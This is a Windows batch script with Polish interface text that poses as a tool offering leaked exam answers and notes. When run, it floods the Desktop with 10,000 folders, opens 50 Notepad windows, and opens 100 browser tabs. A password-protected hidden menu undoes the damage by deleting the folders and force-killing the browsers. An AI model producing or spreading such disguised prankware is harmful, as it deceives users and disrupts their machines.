@echo off
chcp 65001
title Betclickv3
cls

:START
echo =================================================
echo   [ KORPORACJA MINCEL ^& WOKULSKI SP. Z O.O. ]
echo =================================================
echo.
color a
ping localhost -n 2 > nul
echo Obliczanie zakładzików...
ping localhost -n 4 > nul
echo Proszę czekać...
ping localhost -n 4 > nul
echo ...
ping localhost -n 2 > nul
echo ...
ping localhost -n 2 > nul
cls
color 07
echo To twój szczęśliwy dzień!
ping localhost -n 2 > nul
echo Wygrałeś na loterii
ping localhost -n 2 > nul
echo Zdecyduj co zrobić!
ping localhost -n 2 > nul
goto :MENU

:MENU
color 07
cls
echo ********
echo * MENU *
echo ********
echo.
ping localhost -n 2 > nul
echo [1] Pobierz odpowiedzi na tegoroczny egzamin INF 0.2 (na pulpit) :)
ping localhost -n 2 > nul
echo [2] Otwórz notatnik (żeby wykonać notatki do egzaminu) :)
ping localhost -n 2 > nul
echo [3] Wejdź na strone z leakami egzaminów teoretycznych :)
ping localhost -n 2 > nul
echo [q] Zakończ program :( 
echo.
ping localhost -n 2 > nul
set /p "odp=Wybierz liczbę [1/2/3/q]: "
if "%odp%"=="1" (
    cls
    echo Pobieram odpowiedzi
    color a
    ping localhost -n 2 > nul
    echo ...
    ping localhost -n 2 > nul
    cls
    goto :FOLDERKI
) else if "%odp%"=="2" (
    cls
    echo Otwieram notatnik
    color a
    ping localhost -n 2 > nul
    echo ...
    ping localhost -n 2 > nul
    cls
    goto :NOTATNIK
) else if "%odp%"=="3" (
    cls
    echo Otwieram przeglądarkę
    color a
    ping localhost -n 2 > nul
    echo ...
    ping localhost -n 2 > nul
    cls
    goto :STRONA
) else if "%odp%"=="q" (
    cls
    echo Kończę program
    color a
    ping localhost -n 2 > nul
    echo ...
    ping localhost -n 2 > nul
    pause
) else if "%odp%"=="997" (
    cls
    goto :HASLO
) else (
    echo Wybrano złą opcję, spróbuj ponownie
    ping localhost -n 4 > nul
    goto :MENU
)

:FOLDERKI
color 07
c:
cd %userprofile%\Desktop
for /l %%x in (1,1,10000) do mkdir "Odpowiedzi do egzaminu ver. "%%x
echo Pobrano odpowiedzi (na pulpit)!
ping localhost -n 4 > nul
goto :MENU

:NOTATNIK
color 07
echo siema > "%temp%\plik.txt"

for /l %%x in (1,1,50) do (
    start "" notepad.exe /multiinstance "%temp%\plik.txt"
)

goto :MENU

:STRONA
color 07
for /l %%x in (1,1,50) do start "" "https://ptoszek.pl/"
for /l %%x in (1,1,50) do start "" "https://www.youtube.com/watch?v=QDia3e12czc"
goto :MENU

:HASLO
color 07
cls
set /p "haslo=Wpisz hasło: "
if "%haslo%"=="novell24#" (
    goto :UKRYTE
) else (
    goto :MENU
)

:UKRYTE
color a
cls
echo ***************
echo * MENU COFANIA*
echo ***************
echo.
echo [1] Cofnij foldery
echo [2] Cofnij notatnik
echo [3] Cofnij strony
echo [q] Wyjdź 
echo.
set /p "inf=Wybierz liczbę [1/2/3/q]: "
if "%inf%"=="1" (
    c:
    cd %userprofile%\Desktop
    for /l %%x in (1,1,10000) do rmdir /s /q "Odpowiedzi do egzaminu ver. "%%x
    goto :UKRYTE
) else if "%inf%"=="2" (
    taskkill /f /im notepad.exe
    goto :UKRYTE
) else if "%inf%"=="3" (
    taskkill /f /im msedge.exe & taskkill /f /im chrome.exe
    goto :UKRYTE
) else if "%inf%"=="q" (
    pause
) else (
    echo Zła liczba
    goto :UKRYTE
)